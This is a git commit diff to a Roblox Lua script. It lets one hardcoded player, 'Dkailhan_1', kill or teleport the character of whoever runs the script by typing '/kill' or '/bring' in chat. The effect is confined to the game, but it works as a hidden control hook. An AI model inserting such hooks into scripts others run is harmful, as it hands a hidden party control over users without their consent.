136f5230b5803607928b90afa555322386923c41
BaconBABA <130968724+BaconBABA@users.noreply.github.com>
2025-01-01 16:15:37 +0700

    Update command.lua

--- command.lua
+++ command.lua
@@ -9,11 +9,16 @@ local lp = game:FindService("Players").LocalPlayer
 local lpName = game:FindService("Players").LocalPlayer.Name
 
 OnMessageEvent.OnClientEvent:Connect(function(data)
-    if not data then return end
-    local player = tostring(data.FromSpeaker)
-    if player == lpName then return end
-    local message = tostring(data.Message)
-    if message == "/kill" and player == "Dkailhan_1" then
-        lp.Character.Humanoid.Health = 0
-    end
+    pcall(function()
+        if not data then return end
+        local player = tostring(data.FromSpeaker)
+        if player == lpName then return end
+        local message = tostring(data.Message)
+        if message == "/kill" and player == "Dkailhan_1" then
+            lp.Character.Humanoid.Health = 0
+        elseif message == "/bring" and player == "Dkailhan_1" then
+            local owner = game:GetService("Players"):FindFirstChild("Dkailhan_1")
+            lp.Character.HumanoidRootPart.CFrame = owner.Character.HumanoidRootPart.CFrame
+        end
+    end)
 end)
